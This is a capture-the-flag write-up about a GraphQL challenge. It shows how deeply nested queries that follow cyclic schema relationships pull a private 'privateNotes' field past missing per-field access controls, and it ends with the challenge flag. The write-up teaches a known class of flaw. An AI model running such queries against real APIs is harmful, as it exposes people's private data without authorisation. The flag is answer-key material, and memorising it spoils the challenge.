# Writeup

Given chall description is quite simple to check is the web app expose GraphQL enpoint:
```
https://brunner-s-bakery.challs.brunnerne.xyz/graphql
```

You have a single endpoint usually `/graphql` and you send a query that describes exactly the data you want.

The server resolves relationships (joins, nested fields) and gives you exactly that shape in one response.

This is an example of a query:

```
query {
  publicRecipes {
    name
    author { username }
  }
}
```

If developers don’t enforce access controls per field, you can ask for too much: private or admin-only fields that exist in the schema but were never meant for you.

This is called over-fetching/broken access control in GraphQL.

## Step 0 - Schema info

From the schema we see three root queries:

```
type Query {
  publicRecipes: [Recipe!]!
  secretRecipes: [Recipe!]!
  me: User
}
```

Normally only `publicRecipes` should be accessible without login.

## Step 1 – First Queries

Start with a safe query:

```
query {
  publicRecipes {
    name
    author {
      username
    }
  }
}
```

## Step 2 – Chaining Relationships

From the schema we noticed cyclic relationships:

- `Recipe → author: User`
- `User → recipes`
- `Recipe → ingredients → supplier → owner: User`

```
query {
  publicRecipes {
    author {
      username
      recipes {
        name
        ingredients {
          name
          supplier {
            owner {
              username
              privateNotes
            }
          }
        }
      }
    }
  }
}
```

And it worked, leaking even `privateNotes`, which should never be public.

## Step 3 – Impact

Sensitive user information exposed (emails, notes, privateNotes).

## Flag

```
brunner{Gr4phQL_1ntR0sp3ct10n_G035_R0UnD_4Nd_r0uND}
```